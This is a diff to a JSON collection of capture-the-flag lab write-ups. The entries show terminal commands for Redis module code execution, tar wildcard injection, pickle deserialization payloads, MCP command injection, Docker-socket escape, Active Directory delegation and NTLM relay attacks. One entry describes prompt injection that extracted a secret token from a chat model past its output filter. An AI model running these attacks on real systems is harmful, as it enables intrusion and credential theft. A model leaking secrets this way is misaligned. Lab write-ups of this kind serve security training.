@@ -2,7 +2,7 @@
   {
     "schemaVersion": 2,
     "slug": "macc-2026-india-delhi-mumbai",
-    "title": "MACC India — Delhi to Mumbai",
+    "title": "MACC India: Delhi to Mumbai",
     "platform": "MACC 2026",
     "target": "Delhi → Mumbai",
     "difficulty": "Intermediate",
@@ -15,17 +15,15 @@
     "heroIcon": "https://cdn.jsdelivr.net/gh/devicons/devicon@latest/icons/redis/redis-original.svg",
     "heroAlt": "Redis logo",
     "maskedFlag": "flag_f6dacade_****… + flag_********",
-    "summary": "Unauthenticated Redis code execution, a tar wildcard escape from the container, SSH-agent hijacking, and sudo find produced both India flags.",
-    "intro": "India was a two-host chain. Delhi exposed Redis and SSH; Mumbai was reachable only after turning a container foothold into host access and borrowing a live SSH agent. The commands below follow the recovered MACC terminal session in order.",
-    "evidenceNote": "The export directly preserves the Delhi flag, the Redis shell, the scheduled-job escape, SSH access to both hosts, and root on Mumbai. The Mumbai flag value was not preserved, so its format remains masked.",
+    "summary": "Redis access on Delhi led to a host shell, an SSH-agent pivot, and root on Mumbai.",
     "tags": ["redis", "docker", "wildcard-injection", "ssh-agent", "sudo"],
     "tools": ["nmap", "redis-cli", "redis-rogue-server", "ssh", "find"],
     "sections": [
       {
         "title": "Recon",
-        "body": "The initial scan found SSH and Redis 6.2 on Delhi. Redis accepted unauthenticated commands, making module loading the first practical route instead of guessing SSH credentials.",
+        "body": "I found SSH and Redis 6.2. Redis accepted commands without authentication.",
         "terminal": {
-          "title": "kali — Delhi reconnaissance",
+          "title": "kali: Delhi reconnaissance",
           "lines": [
             "$ nmap -sC -sV -p- 176.16.64.*** --min-rate 3000",
             "22/tcp   open  ssh    OpenSSH 8.9p1",
@@ -36,13 +34,13 @@
             "tcp_port:6379"
           ]
         },
-        "note": "The target was a retired, isolated competition instance. Addresses are partially masked, but the exposed service and attack decision are preserved."
+        "note": "Instance addresses are masked."
       },
       {
         "title": "Redis module execution",
-        "body": "redis-rogue-server temporarily changed the Redis master, delivered a malicious module, loaded it, and opened an interactive command channel. The resulting uid 0 shell was inside the Redis container.",
+        "body": "I loaded a Redis module with redis-rogue-server and got root inside the container.",
         "terminal": {
-          "title": "kali — rogue Redis module",
+          "title": "kali: rogue Redis module",
           "lines": [
             "$ git clone https://github.com/n0b0dyCN/redis-rogue-server.git /tmp/rrs",
             "$ python3 redis-rogue-server.py --rhost 176.16.64.*** --rport 6379 --lhost 176.16.64.*** --lport 21000 --exp exp.so",
@@ -55,13 +53,13 @@
             "jobs  processed"
           ]
         },
-        "note": "Container root was not the objective. The useful discovery was the host-backed data directory consumed by an external scheduled process."
+        "note": "The container shared a jobs directory with a host process."
       },
       {
         "title": "Escape through the archive job",
-        "body": "The jobs directory was processed by tar. Creating tar checkpoint filenames caused the scheduled host-side archive command to execute shell.sh. That script copied the Delhi flag into the shared directory and confirmed that it ran as svcuser outside the Redis container.",
+        "body": "A scheduled tar job processed the shared directory. Checkpoint filenames made it run shell.sh as svcuser on the host.",
         "terminal": {
-          "title": "redis shell — tar checkpoint injection",
+          "title": "redis shell: tar checkpoint injection",
           "lines": [
             "# echo '#!/bin/bash' > /opt/app/data/jobs/shell.sh",
             "# echo 'cat /home/local.txt > /opt/app/data/jobs/flag.txt' >> /opt/app/data/jobs/shell.sh",
@@ -76,13 +74,13 @@
             "uid=1001(svcuser) gid=1002(svcuser) groups=1002(svcuser),1001(monitoring)"
           ]
         },
-        "note": "This is the first captured flag. Only its recognizable prefix is shown."
+        "note": "Flag masked."
       },
       {
         "title": "SSH onto Delhi",
-        "body": "A fresh ED25519 key was generated on Kali. The same scheduled-job primitive appended the public key to svcuser's authorized_keys file, producing a stable host shell.",
+        "body": "I used the same job to add an ED25519 key to svcuser's authorized_keys file.",
         "terminal": {
-          "title": "kali + Redis shell — key placement",
+          "title": "kali + Redis shell: key placement",
           "lines": [
             "$ ssh-keygen -t ed25519 -f /tmp/india_key -N ''",
             "$ cat /tmp/india_key.pub",
@@ -96,9 +94,9 @@
       },
       {
         "title": "SSH-agent pivot to Mumbai",
-        "body": "Delhi exposed a live agent socket. Pointing SSH_AUTH_SOCK at it revealed an ED25519 identity for the admin account and allowed authentication to Mumbai without extracting the private key.",
+        "body": "Delhi had a live SSH-agent socket. I used its admin identity to connect to Mumbai.",
         "terminal": {
-          "title": "Delhi — agent hijacking",
+          "title": "Delhi: agent hijacking",
           "lines": [
             "svcuser@delhi$ export SSH_AUTH_SOCK=/run/ssh-agent/agent.sock",
             "svcuser@delhi$ ssh-add -l",
@@ -107,13 +105,13 @@
             "admin@mumbai:~$"
           ]
         },
-        "note": "The socket was the credential. The private key never needed to be copied."
+        "note": "The private key stayed inside the agent."
       },
       {
         "title": "Root on Mumbai",
-        "body": "The admin account could execute /usr/bin/find through sudo. find's -exec action launched a privileged shell. The export proves the root shell and the subsequent move to the next lab, although the raw Mumbai flag line was not retained.",
+        "body": "admin could run find with sudo. I used -exec to start a root shell.",
         "terminal": {
-          "title": "Mumbai — sudo find",
+          "title": "Mumbai: sudo find",
           "lines": [
             "admin@mumbai$ sudo /usr/bin/find . -exec /bin/bash -p \\; -quit",
             "root@mumbai# whoami",
@@ -129,7 +127,7 @@
   {
     "schemaVersion": 2,
     "slug": "openclaw-model-reload",
-    "title": "OpenClaw — Poisoning the shared model",
+    "title": "OpenClaw: Shared model poisoning",
     "platform": "SecDojo",
     "target": "Nexus Corp. OpenClaw",
     "difficulty": "Advanced",
@@ -142,17 +140,15 @@
     "heroIcon": "https://cdn.jsdelivr.net/gh/devicons/devicon@latest/icons/jupyter/jupyter-original.svg",
     "heroAlt": "Jupyter logo",
     "maskedFlag": "flag_********_****…",
-    "summary": "An exposed Jupyter token led to a shared model volume; unsafe pickle loading plus the correct administrative reload header produced code execution.",
-    "intro": "OpenClaw looked like an ML platform rather than a traditional web target. The useful path was Jupyter → deployment notebook → shared models volume → malicious pickle → authenticated model reload.",
-    "evidenceNote": "The saved chat explicitly marks this lab complete and preserves the Jupyter access, shared volume, model poisoning, API-key format, successful reload, and output-file technique. The final flag value itself was not retained.",
+    "summary": "A Jupyter token and shared model volume led to code execution through pickle deserialization.",
     "tags": ["jupyter", "pickle", "deserialization", "ml-security", "model-serving"],
     "tools": ["nmap", "curl", "Jupyter API", "Python", "pickle"],
     "sections": [
       {
         "title": "Enumerating the ML stack",
-        "body": "The target exposed a web application, MLflow, and Jupyter. Jupyter rejected anonymous API requests but its token was later recovered from the environment and used to create a terminal session.",
+        "body": "The host exposed a web app, MLflow, and Jupyter. I used a recovered Jupyter token to open a terminal.",
         "terminal": {
-          "title": "kali — service discovery",
+          "title": "kali: service discovery",
           "lines": [
             "$ nmap -sV -p- 176.16.33.*** --min-rate 5000",
             "80/tcp   open  http",
@@ -167,9 +163,9 @@
       },
       {
         "title": "Reading the deployment notebook",
-        "body": "A Jupyter terminal exposed notebooks under /home/jovyan/work. The deployment notebook documented a shared directory mounted into the model server and showed that model.pkl was the production artifact.",
+        "body": "The deployment notebook showed a shared models directory and model.pkl as the loaded artifact.",
         "terminal": {
-          "title": "Jupyter terminal — deployment notes",
+          "title": "Jupyter terminal: deployment notes",
           "lines": [
             "$ ls /home/jovyan",
             "shared-models  work",
@@ -181,13 +177,13 @@
             "administrative reload required after deployment"
           ]
         },
-        "note": "The model was cached. Merely replacing the file did not execute a new payload until the server reloaded it."
+        "note": "Replacing the file did nothing until the server reloaded it."
       },
       {
         "title": "Building the pickle payload",
-        "body": "A pickle object used __reduce__ to call os.system during deserialization. Its command wrote identity, proof-file output, and a small filesystem trace to /models/out.txt, which mapped back into Jupyter's shared-models directory.",
+        "body": "I created a pickle payload whose __reduce__ method called os.system and wrote the output to the shared volume.",
         "terminal": {
-          "title": "Jupyter terminal — malicious artifact",
+          "title": "Jupyter terminal: malicious artifact",
           "lines": [
             "$ python3 - <<'PY'",
             "import os, pickle",
@@ -203,9 +199,9 @@
       },
       {
         "title": "Triggering the administrative reload",
-        "body": "The initial Bearer header was wrong for the reload route. The working request used X-API-Key and the recovered cl4w-r3l04d prefix. A health response reporting type int confirmed that the pickle had executed because os.system returns an integer.",
+        "body": "The reload endpoint expected X-API-Key. After reloading, the health endpoint reported type int and the output file contained the flag.",
         "terminal": {
-          "title": "Jupyter terminal — model server",
+          "title": "Jupyter terminal: model server",
           "lines": [
             "$ curl -s -X POST -H 'X-API-Key: cl4w-r3l04d-********' http://model-server:8080/admin/reload",
             "{\"status\":\"reloaded\"}",
@@ -216,7 +212,7 @@
             "flag_********_****_****_****_************"
           ]
         },
-        "note": "The key debugging clue was the model type. type:int proved code execution before the output path was corrected."
+        "note": "type:int came from os.system's return value."
       }
     ],
     "externalUrl": ""
@@ -224,7 +220,7 @@
   {
     "schemaVersion": 2,
     "slug": "autoflow-n8n-docker-socket",
-    "title": "AutoFlow — n8n to host root",
+    "title": "AutoFlow: n8n to host root",
     "platform": "SecDojo",
     "target": "AutoFlow Systems",
     "difficulty": "Intermediate",
@@ -237,17 +233,15 @@
     "heroIcon": "https://cdn.jsdelivr.net/gh/devicons/devicon@latest/icons/docker/docker-original.svg",
     "heroAlt": "Docker logo",
     "maskedFlag": "flag_c8cf449c_****…",
-    "summary": "A debug webhook exposed n8n credentials; an n8n Code node reached /run/docker.sock and launched a read-only host-mounted container.",
-    "intro": "AutoFlow started as an n8n investigation. The important pivot was not the fake internal AI services—it was the mounted Docker socket visible from the workflow runtime.",
-    "evidenceNote": "The export preserves the service discovery, n8n access, environment enumeration, Docker API requests, container ID, logs, root proof, and explicit completion statement.",
+    "summary": "Leaked n8n credentials and an exposed Docker socket gave access to the host filesystem.",
     "tags": ["n8n", "docker-socket", "container-escape", "workflow-security"],
     "tools": ["nmap", "curl", "n8n", "Node.js http", "Docker API"],
     "sections": [
       {
         "title": "Finding n8n",
-        "body": "Nmap exposed n8n on port 5678 and a health webhook on 8080. The webhook returned debug credentials that opened the n8n web interface.",
+        "body": "Nmap found n8n on 5678 and a webhook on 8080. The webhook response included n8n credentials.",
         "terminal": {
-          "title": "kali — initial access",
+          "title": "kali: initial access",
           "lines": [
             "$ nmap -sC -sV -p- 176.16.28.*** --min-rate 5000",
             "5678/tcp open  http  n8n",
@@ -259,9 +253,9 @@
       },
       {
         "title": "Understanding the Code node",
-        "body": "fetch and $http were unavailable, but the runtime allowed selected built-in modules. Reading /proc/1/environ confirmed that Node's http module was allowed and /proc/mounts revealed /run/docker.sock.",
+        "body": "fetch and $http were blocked. Node's http module was allowed, and /run/docker.sock was mounted.",
         "terminal": {
-          "title": "n8n Code node — runtime inspection",
+          "title": "n8n Code node: runtime inspection",
           "lines": [
             "$ fetch('http://localhost/')",
             "error: fetch is not defined",
@@ -271,13 +265,13 @@
             "tmpfs /run/docker.sock tmpfs rw,nosuid,nodev,size=391276k ..."
           ]
         },
-        "note": "The failed fetch attempts mattered: the node was restricted, but not enough to prevent Unix-socket access through node:http."
+        "note": "node:http could still send requests over the Unix socket."
       },
       {
         "title": "Enumerating Docker",
-        "body": "The Code node sent HTTP directly over the Unix socket. /containers/json showed the nginx, n8n, and postgres containers and confirmed control of the Docker daemon.",
+        "body": "I queried /containers/json through the socket and found nginx, n8n, and postgres.",
         "terminal": {
-          "title": "n8n Code node — Docker API",
+          "title": "n8n Code node: Docker API",
           "lines": [
             "$ GET unix:///run/docker.sock/containers/json",
             "HTTP/1.1 200 OK",
@@ -289,9 +283,9 @@
       },
       {
         "title": "Mounting the host read-only",
-        "body": "A disposable Alpine container was created with / mounted at /host in read-only mode. Its command read /host/root/proof.txt, then the workflow started the container and fetched its logs.",
+        "body": "I started a container with / mounted at /host:ro and read /host/root/proof.txt from its logs.",
         "terminal": {
-          "title": "n8n Code node — host proof",
+          "title": "n8n Code node: host proof",
           "lines": [
             "$ POST unix:///run/docker.sock/containers/create",
             "Image: nginx:alpine",
@@ -303,7 +297,7 @@
             "flag_c8cf449c_****_****_****_************"
           ]
         },
-        "note": "The read-only bind was enough to prove host compromise while avoiding unnecessary modification."
+        "note": "The host bind was read-only."
       }
     ],
     "externalUrl": ""
@@ -311,7 +305,7 @@
   {
     "schemaVersion": 2,
     "slug": "novamind-mcp-command-injection",
-    "title": "NovaMind — command injection through MCP",
+    "title": "NovaMind: MCP command injection",
     "platform": "SecDojo",
     "target": "NovaMind Inc.",
     "difficulty": "Intermediate",
@@ -322,17 +316,15 @@
     "publishedAt": "2026-07-29T17:13:00.000Z",
     "symbol": "MCP",
     "maskedFlag": "flag_48af417e_****…",
-    "summary": "The MCP model-evaluation tool validated model_name but passed benchmark into a shell command, allowing /root/proof.txt to be read.",
-    "intro": "NovaMind was the cleanest MCP lab in the export. The service exposed a Streamable HTTP MCP endpoint, tools/list showed the attack surface, and one argument crossed directly into a shell.",
-    "evidenceNote": "The MCP initialization, session ID, tool enumeration, failed probes, successful benchmark injection, exact flag prefix, and transition to the next lab are all preserved.",
+    "summary": "The benchmark argument in an MCP tool was vulnerable to command injection.",
     "tags": ["mcp", "command-injection", "ai-security", "json-rpc"],
     "tools": ["nmap", "curl", "MCP", "JSON-RPC"],
     "sections": [
       {
         "title": "Service discovery",
-        "body": "The host exposed nginx, a Uvicorn service on 9090, and Ollama on 11434. The Uvicorn /mcp route required a JSON Accept header for initialization.",
+        "body": "I found nginx, Uvicorn on 9090, and Ollama on 11434. MCP ran at /mcp.",
         "terminal": {
-          "title": "kali — NovaMind reconnaissance",
+          "title": "kali: NovaMind reconnaissance",
           "lines": [
             "$ nmap -sV -p- 176.16.21.*** --min-rate 5000",
             "22/tcp    open  ssh",
@@ -346,9 +338,9 @@
       },
       {
         "title": "Starting an MCP session",
-        "body": "Initialization returned mcp-session-id in a response header. Every later JSON-RPC request included that header.",
+        "body": "The initialize response returned an mcp-session-id header required by later requests.",
         "terminal": {
-          "title": "kali — MCP initialize",
+          "title": "kali: MCP initialize",
           "lines": [
             "$ curl -D - -X POST http://176.16.21.***:9090/mcp \\",
             "  -H 'Accept: application/json' -H 'Content-Type: application/json' \\",
@@ -361,9 +353,9 @@
       },
       {
         "title": "Enumerating tools",
-        "body": "tools/list returned five tools. fetch_knowledge_source rejected file:// and localhost URLs. run_model_evaluation accepted model_name, benchmark, subset, and sample-count arguments.",
+        "body": "tools/list exposed run_model_evaluation with model_name and benchmark arguments.",
         "terminal": {
-          "title": "kali — MCP tools",
+          "title": "kali: MCP tools",
           "lines": [
             "$ curl -X POST http://176.16.21.***:9090/mcp -H 'mcp-session-id: eae92b6e1054****************' -d '{\"jsonrpc\":\"2.0\",\"id\":2,\"method\":\"tools/list\",\"params\":{}}'",
             "tool: search_knowledge_base",
@@ -377,9 +369,9 @@
       },
       {
         "title": "Injecting the benchmark",
-        "body": "model_name was validated against an allowlist, but benchmark was concatenated into a shell command. Appending ;cat /root/proof.txt returned the flag inside the MCP tool result.",
+        "body": "benchmark reached a shell command. I appended ;cat /root/proof.txt and read the flag in the tool response.",
         "terminal": {
-          "title": "kali — vulnerable tool call",
+          "title": "kali: vulnerable tool call",
           "lines": [
             "$ curl -X POST http://176.16.21.***:9090/mcp \\",
             "  -H 'mcp-session-id: eae92b6e1054****************' \\",
@@ -389,7 +381,7 @@
             "[stderr] cat: 'subset=all': No such file or directory"
           ]
         },
-        "note": "Schema validation confirmed the parameter shape, not how the implementation used its value."
+        "note": "The schema validated the type, not the shell use."
       }
     ],
     "externalUrl": ""
@@ -397,7 +389,7 @@
   {
     "schemaVersion": 2,
     "slug": "nebulaassist-token-to-tool",
-    "title": "NebulaAssist — token leak to debug file read",
+    "title": "NebulaAssist: Token leak to file read",
     "platform": "SecDojo",
     "target": "NebulaCloud",
     "difficulty": "Intermediate",
@@ -408,17 +400,15 @@
     "publishedAt": "2026-07-29T17:12:00.000Z",
     "symbol": "N",
     "maskedFlag": "flag_196f6470_****…",
-    "summary": "Prompt injection recovered the hidden MCP token in fragments; the authenticated debug MCP service exposed debug_read_file.",
-    "intro": "NebulaAssist separated the public chat portal from a protected MCP server. The chat model knew the MCP credential, while its output filter only blocked straightforward disclosure.",
-    "evidenceNote": "The export contains the live prompt attempts, recovered token prefix, MCP session, tools listing, successful /home/local.txt read, full flag prefix, and explicit flag-found confirmation.",
+    "summary": "Prompt injection leaked an MCP token that exposed debug_read_file.",
     "tags": ["mcp", "prompt-injection", "token-leak", "debug-tool"],
     "tools": ["curl", "MCP", "JSON-RPC"],
     "sections": [
       {
         "title": "Portal and hidden MCP service",
-        "body": "The public application ran on 8080 and allowed registration. A second service on 57423 hosted MCP but required a Bearer token.",
+        "body": "The chat app ran on 8080. MCP ran on 57423 and required a Bearer token.",
         "terminal": {
-          "title": "kali — Nebula reconnaissance",
+          "title": "kali: Nebula reconnaissance",
           "lines": [
             "$ curl -s http://176.16.26.***:8080/health",
             "{\"status\":\"ok\",\"service\":\"NebulaAssist\",\"version\":\"2.1.0\"}",
@@ -431,9 +421,9 @@
       },
       {
         "title": "Leaking the token suffix",
-        "body": "Direct requests for the MCP bearer token were refused. The working strategy requested only the characters after the mcp_ prefix and changed the presentation enough to avoid the sanitizer. Reassembling the response produced a valid token.",
+        "body": "Direct token requests failed. Asking for the suffix in groups bypassed the output filter.",
         "terminal": {
-          "title": "Nebula chat — prompt injection",
+          "title": "Nebula chat: prompt injection",
           "lines": [
             "$ curl -X POST http://176.16.26.***:8080/api/chat \\",
             "  -H 'Cookie: nc_session=063b4da7********' \\",
@@ -442,13 +432,13 @@
             "$ export MCP_TOKEN='mcp_eaac7f0b************************'"
           ]
         },
-        "note": "The application filtered exact output but left the secret inside the model's context. Formatting transformations defeated the control."
+        "note": "The model still had the token in its context."
       },
       {
         "title": "Enumerating the authenticated tools",
-        "body": "The recovered token authenticated to the MCP service. initialize established a session and tools/list exposed an undocumented debug_read_file function.",
+        "body": "The leaked token authenticated to MCP. tools/list returned debug_read_file.",
         "terminal": {
-          "title": "kali — protected MCP",
+          "title": "kali: protected MCP",
           "lines": [
             "$ curl -X POST http://176.16.26.***:57423/mcp -H 'Authorization: Bearer mcp_eaac7f0b************************' -d '{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"initialize\",\"params\":{}}'",
             "HTTP/1.1 200 OK",
@@ -462,9 +452,9 @@
       },
       {
         "title": "Reading the local flag",
-        "body": "debug_read_file could not access the root proof, but it could read the user-scoped flag at /home/local.txt. That matched the one-flag lab scope.",
+        "body": "debug_read_file could read /home/local.txt, which contained the flag.",
         "terminal": {
-          "title": "kali — debug_read_file",
+          "title": "kali: debug_read_file",
           "lines": [
             "$ curl -X POST http://176.16.26.***:57423/mcp \\",
             "  -H 'Authorization: Bearer mcp_eaac7f0b************************' \\",
@@ -482,7 +472,7 @@
   {
     "schemaVersion": 2,
     "slug": "n7sec-the-leaky-packet",
-    "title": "N7SEC — The Leaky Packet",
+    "title": "N7SEC: The Leaky Packet",
     "platform": "N7SEC",
     "target": "capture.pcap",
     "difficulty": "Forensics",
@@ -495,17 +485,15 @@
     "heroIcon": "https://cdn.simpleicons.org/wireshark/1679A7",
     "heroAlt": "Wireshark logo",
     "maskedFlag": "N7SEC{dns_3xf1l********}",
-    "summary": "Ordered hexadecimal chunks embedded in DNS labels reconstructed the exfiltrated N7SEC flag.",
-    "intro": "The packet capture contained repeated DNS queries whose subdomains changed while the destination stayed fixed. The changing labels carried a sequence number followed by hexadecimal data.",
-    "evidenceNote": "The user explicitly states that Forensics 1 and 2 were solved. The export preserves this challenge's recovered flag and the DNS reconstruction method.",
+    "summary": "DNS labels contained ordered hex chunks of the flag.",
     "tags": ["forensics", "pcap", "dns", "exfiltration"],
     "tools": ["Wireshark", "tshark", "Python"],
     "sections": [
       {
         "title": "Protocol triage",
-        "body": "A protocol hierarchy and DNS-query export made the anomalous traffic obvious: many requests to evil.com used long, structured subdomains.",
+        "body": "I exported DNS queries and found numbered hex data in subdomains of evil.com.",
         "terminal": {
-          "title": "macOS — DNS triage",
+          "title": "macOS: DNS triage",
           "lines": [
             "$ tshark -r capture.pcap -q -z io,phs",
             "$ tshark -r capture.pcap -Y 'dns.qry.name' -T fields -e frame.number -e dns.qry.name | head",
@@ -517,9 +505,9 @@
       },
       {
         "title": "Reassembling the labels",
-        "body": "The first two characters were treated as the sequence index. The fixed .evil.com suffix was removed, chunks were sorted numerically, concatenated, and decoded from hex.",
+        "body": "I removed the domain, sorted by the first two characters, joined the chunks, and decoded the result from hex.",
         "terminal": {
-          "title": "macOS — extraction",
+          "title": "macOS: extraction",
           "lines": [
             "$ tshark -r capture.pcap -Y 'dns.qry.name contains \"evil.com\"' -T fields -e dns.qry.name > dns.txt",
             "$ python3 extract_dns.py dns.txt",
@@ -528,7 +516,7 @@
             "N7SEC{dns_3xf1l***************}"
           ]
         },
-        "note": "The domain is shown because it is part of the forensic explanation; the unique flag is partially masked."
+        "note": "Flag masked."
       }
     ],
     "externalUrl": ""
@@ -536,7 +524,7 @@
   {
     "schemaVersion": 2,
     "slug": "n7sec-cache-rules-everything",
-    "title": "N7SEC — Cache Rules Everything",
+    "title": "N7SEC: Cache Rules Everything",
     "platform": "N7SEC",
     "target": "chrome_profile.zip",
     "difficulty": "Forensics",
@@ -549,17 +537,15 @@
     "heroIcon": "https://cdn.jsdelivr.net/gh/devicons/devicon@latest/icons/chrome/chrome-original.svg",
     "heroAlt": "Google Chrome logo",
     "maskedFlag": "N7SEC{d3l3t3d_********}",
-    "summary": "Chrome history identified a deleted credential archive; the cached HTTP body survived in f_00000e with the flag in plaintext.",
-    "intro": "The browser profile told two stories: History recorded where the archive came from, and Cache_Data preserved the response after the downloaded file had been deleted.",
-    "evidenceNote": "The export explicitly identifies this as solved Forensics 2 and preserves the suspicious URL, cache entry, and recovered flag.",
+    "summary": "Chrome cache still contained a deleted credential archive and its flag.",
     "tags": ["forensics", "chrome", "cache", "sqlite"],
     "tools": ["sqlite3", "strings", "file", "unzip"],
     "sections": [
       {
         "title": "Reading Chrome History",
-        "body": "The History SQLite database was queried for downloads and suspicious URLs. It revealed a credential archive fetched from dl-files.cc.",
+        "body": "Chrome History showed a credential archive downloaded from dl-files.cc.",
         "terminal": {
-          "title": "macOS — Chrome history",
+          "title": "macOS: Chrome history",
           "lines": [
             "$ unzip -q chrome_profile.zip -d chrome_profile",
             "$ sqlite3 'chrome_profile/Default/History' 'select target_path, tab_url from downloads;'",
@@ -571,9 +557,9 @@
       },
       {
         "title": "Recovering the cached response",
-        "body": "Searching cache strings for the archive name led to Cache_Data/f_00000e. The cached HTTP response still contained the deleted material and the flag.",
+        "body": "The archive name appeared in Cache_Data/f_00000e. strings recovered the flag.",
         "terminal": {
-          "title": "macOS — Cache_Data",
+          "title": "macOS: Cache_Data",
           "lines": [
             "$ grep -RIl 'n7sec_internal_credentials' chrome_profile/Default/Cache/Cache_Data",
             "chrome_profile/Default/Cache/Cache_Data/f_00000e",
@@ -583,7 +569,7 @@
             "N7SEC{d3l3t3d_********}"
           ]
         },
-        "note": "Deleting a downloaded file does not remove every copy. Browser caches, journal files, and unallocated space can retain the response."
+        "note": "The download was gone, but the cached response remained."
       }
     ],
     "externalUrl": ""
@@ -591,7 +577,7 @@
   {
     "schemaVersion": 2,
     "slug": "ad105-sokolo-first-forest",
-    "title": "AD105 — Two flags captured, final trust unresolved",
+    "title": "AD105: Two flags, final trust unresolved",
     "platform": "SecDojo",
     "target": "SOKOLO / LONIPO / BORITO",
     "difficulty": "Advanced",
@@ -602,17 +588,15 @@
     "publishedAt": "2026-07-29T17:09:00.000Z",
     "symbol": "AD",
     "maskedFlag": "2 / 3 captured",
-    "summary": "A low-privilege SOKOLO user became local SYSTEM and then domain administrator. Two flags were captured before the final cross-forest path stalled.",
-    "intro": "AD105 was the deepest investigation in the session. This progress log follows the successful workstation-to-domain path, the trust work, and the final blocker without exposing reusable credentials or full proof values.",
-    "evidenceNote": "Two of three objectives were captured. Sensitive values and per-instance proof data are masked.",
+    "summary": "I reached SYSTEM on WS and Administrator on SOKOLO. The LONIPO path remained blocked.",
     "tags": ["active-directory", "kerberos", "rbcd", "ntlm-relay", "forest-trusts", "stopped"],
     "tools": ["Evil-WinRM", "Impacket", "Mimikatz", "PetitPotam", "BloodHound", "bloodyAD"],
     "sections": [
       {
         "title": "Initial foothold on the workstation",
-        "body": "The supplied SOKOLO\\SecDojo credentials authenticated to WinRM on the workstation. Enumeration showed that the account was a normal Domain User but had local administrative rights on WS.",
+        "body": "SOKOLO\\SecDojo had WinRM access and local administrator rights on WS.",
         "terminal": {
-          "title": "kali — workstation access",
+          "title": "kali: workstation access",
           "lines": [
             "$ evil-winrm -i 176.16.37.*** -u SecDojo -p 'P***************'",
             "PS> whoami /all",
@@ -626,9 +610,9 @@
       },
       {
         "title": "Local SYSTEM through Kerberos delegation",
-        "body": "A machine account was created and resource-based constrained delegation was written against WS. A service ticket impersonating Administrator to cifs/WS produced a SYSTEM shell with impacket-psexec.",
+        "body": "I created a machine account, configured RBCD against WS, and impersonated Administrator for cifs/WS.",
         "terminal": {
-          "title": "kali — RBCD to WS",
+          "title": "kali: RBCD to WS",
           "lines": [
             "$ bloodyAD -u 'WS$' -p '********' -d SOKOLO.dojo --dc-ip 176.16.37.*** add rbcd 'WS$' 'EVILPC$'",
             "result: EVILPC$ can now impersonate users on WS$",
@@ -639,13 +623,13 @@
             "nt authority\\system"
           ]
         },
-        "note": "This established workstation control only. It did not automatically grant domain replication rights."
+        "note": "This gave SYSTEM on WS, not DCSync rights."
       },
       {
         "title": "Recovering domain administrator material",
-        "body": "The workstation's local registry hives and cached secrets were collected. The recovered Administrator material later authenticated to the SOKOLO domain controller over WinRM.",
+        "body": "I saved the local SAM and SYSTEM hives, extracted the Administrator hash, and used it on the SOKOLO controller.",
         "terminal": {
-          "title": "WS SYSTEM — credential material",
+          "title": "WS SYSTEM: credential material",
           "lines": [
             "C:\\Windows\\Temp> reg save HKLM\\SYSTEM system.bak",
             "The operation completed successfully.",
@@ -661,25 +645,25 @@
       },
       {
         "title": "Capturing the SOKOLO flag",
-        "body": "The recovered Administrator material opened the primary controller and confirmed the first captured objective. The proof value is intentionally masked.",
+        "body": "The Administrator hash opened WinRM on the SOKOLO controller. I read the first proof file there.",
         "terminal": {
-          "title": "SOKOLO DC — flag one",
+          "title": "SOKOLO DC: flag one",
           "lines": [
             "PS> dir C:\\Users\\Administrator\\Desktop",
             "proof.txt",
             "PS> type C:\\Users\\Administrator\\Desktop\\proof.txt",
             "flag_0b7ef7e4_****_****_****_************",
             "PS> nltest /domain_trusts /all_trusts",
-            "LONIPO.dojo — Direct Outbound forest trust"
+            "LONIPO.dojo: Direct Outbound forest trust"
           ]
         },
-        "note": "The full proof value and reusable authentication material are intentionally omitted."
+        "note": "Proof and credentials masked."
       },
       {
         "title": "Trying to cross into LONIPO",
-        "body": "The next objective was DC2 in the LONIPO forest. The work recovered the SOKOLO$ trust account context, confirmed coercion against DC2, and attempted to relay the resulting authentication into LDAP or LDAPS for delegation rights.",
+        "body": "I coerced DC2 authentication and tried LDAP and LDAPS relay for delegation rights.",
         "terminal": {
-          "title": "kali — coercion and relay attempts",
+          "title": "kali: coercion and relay attempts",
           "lines": [
             "$ impacket-ntlmrelayx -t ldap://176.16.37.*** --delegate-access --remove-mic -debug",
             "$ python3 printerbug.py -k -no-pass 'LONIPO.dojo/SOKOLO$'@DC2.LONIPO.dojo 176.16.37.***",
@@ -690,16 +674,16 @@
             "error: channel binding / authentication rejected"
           ]
         },
-        "note": "The callback worked. The failure was the relay target's protections and rights—not basic routing."
+        "note": "Coercion worked. LDAP signing and channel binding stopped the relay."
       },
       {
         "title": "Final stopping point",
-        "body": "The remaining attempts explored cross-DC shadow credentials, RDP through port forwards, pass-the-hash, DCSync, and BloodHound trust paths. SecDojo lacked RDP and replication rights on the controllers; Administrator material from SOKOLO did not cross the forest boundary; LDAP signing and LDAPS channel binding blocked the relay route. BORITO was never reached with an authenticated administrative path.",
+        "body": "RDP, pass-the-hash, DCSync, shadow credentials, and trust-path checks did not produce access to BORITO.",
         "terminal": {
-          "title": "AD105 — final status",
+          "title": "AD105: final status",
           "lines": [
-            "captured objectives — 2 / 3",
-            "final forest path — unresolved",
+            "captured objectives: 2 / 3",
+            "final forest path: unresolved",
             "blocker: SMB signing on domain controllers",
             "blocker: LDAP signing / LDAPS channel binding",
             "blocker: no DCSync or protected-object write rights",
@@ -713,7 +697,7 @@
   {
     "schemaVersion": 2,
     "slug": "macc-morocco-nexus-servicehub-progress",
-    "title": "MACC Morocco — SSRF into Nexus ServiceHub",
+    "title": "MACC Morocco: SSRF into Nexus ServiceHub",
     "platform": "MACC 2026",
     "target": "Casablanca",
     "difficulty": "Advanced",
@@ -724,17 +708,15 @@
     "publishedAt": "2026-07-29T17:08:00.000Z",
     "symbol": "MA",
     "maskedFlag": "not captured",
-    "summary": "The public webhook tester blocked localhost strings but trusted a hostname that resolved back to the target, exposing an internal Koa service and administrative database routes.",
-    "intro": "Morocco was a 400-point target. The session reached the internal application through an SSRF filter bypass and mapped valuable administrative endpoints, but the competition ended before the internal query surface produced a flag.",
-    "evidenceNote": "The SSRF bypass and internal routes are directly supported by the export. No Morocco flag is claimed.",
+    "summary": "An sslip.io hostname bypassed the webhook SSRF filter and reached the internal Koa service.",
     "tags": ["ssrf", "koa", "nodejs", "webhook", "stopped"],
     "tools": ["nmap", "curl", "sslip.io"],
     "sections": [
       {
         "title": "Public application",
-        "body": "Casablanca exposed SSH and Apache. The web application identified itself as Nexus ServiceHub and offered notes, integrations, and a webhook test feature.",
+        "body": "Casablanca exposed SSH, Apache, and a Nexus ServiceHub web app with a webhook tester.",
         "terminal": {
-          "title": "kali — Casablanca",
+          "title": "kali: Casablanca",
           "lines": [
             "$ nmap -sC -sV 176.16.64.***",
             "22/tcp open  ssh",
@@ -747,9 +729,9 @@
